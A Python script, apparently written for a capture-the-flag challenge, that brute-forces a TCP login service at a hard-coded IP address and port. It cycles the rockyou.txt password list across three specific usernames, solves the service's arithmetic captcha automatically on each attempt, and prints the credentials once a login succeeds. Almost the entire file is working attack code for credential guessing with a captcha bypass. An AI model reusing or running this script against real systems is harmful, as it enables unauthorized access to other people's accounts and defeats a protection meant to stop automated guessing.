#$ nc <ip address here> <port here>

import os
import re
import socket
import time

host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = os.path.dirname(os.path.abspath(__file__)) + "/rockyou.txt" # Point to wordlist file

def brute_force():
	f = open(wordlist, "r+", encoding="latin-1") # Opens file

	result = "Fail\n"
	while result == "Fail\n": # While the result of the password guess is a Failure...
		try: # Try and catch errors (socket or otherwise) to keep script from crashing
		
			# Find username and password
			unames = ["ejnorman84\n", "ejnoman\n", "EricNorman84\n"]
			unum = 0

			lastpos = f.tell()	#Previous word
			pword = f.readline()

			while unum < 3 and result =="Fail\n":
				# We have 3 usernames to check from. Cucle through each for every username.
				# Keeping the '\n' on the end for ease.
				uname = unames[unum]
				unum += 1				

				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Reconnect to the host
				s.connect((host, port))

				time.sleep(.1)
				data = s.recv(1024) #Recieve Captcha
				splitdata = re.search('([0-9]+) ([-+*/]) ([0-9]+)', data.decode("utf-8")) # Parse it into 3 groups

				num1 = int(splitdata.group(1)) # The first int
				opp = splitdata.group(2)       # The opperation
				num2 = int(splitdata.group(3)) # The second int
				ans = 0

				# Do MATH(tm) depending on opperation
				if opp == "+":
					ans = num1 + num2
				elif opp == "-":
					ans = num1 - num2
				elif opp == "*":
					ans = num1 * num2
				elif opp == "/":
					ans = int(num1 / num2)

				ans = str(ans) + '\n'

				s.send(ans.encode("utf-8")) #Send answer
				time.sleep(.1)
				data = s.recv(1024) #Recieve Username prompt

				s.send(uname.encode("utf-8")) #Send username
				time.sleep(.1)
				data = s.recv(1024) #Recieve Password prompt

				s.send(pword.encode("utf-8")) #send Password
				time.sleep(.1)
				data = s.recv(1024) #Recieve results prompt

				result = data.decode("utf-8") #Decode it

				# Uncomment for testing purposes
				#print(uname)
				#print(pword)
				#print(result)

				if result == "Password: " or result == "Username: ": 
					#If we get too ahead of ourselves with recieves, treat it as a failure and retry the used password again as to not skip it.
					result = "Fail\n"
					f.seek(lastpos)
		
		except:
			# Upon caught error, treat the result as a failue, and retry last password.
			result = "Fail\n"
			f.seek(lastpos)

	# Out of loop if 'result' != 'Fail\n'
	# Meaning we got a correct password!!
	print(uname)
	print(pword)
	print(result)


if __name__ == '__main__':
	brute_force()
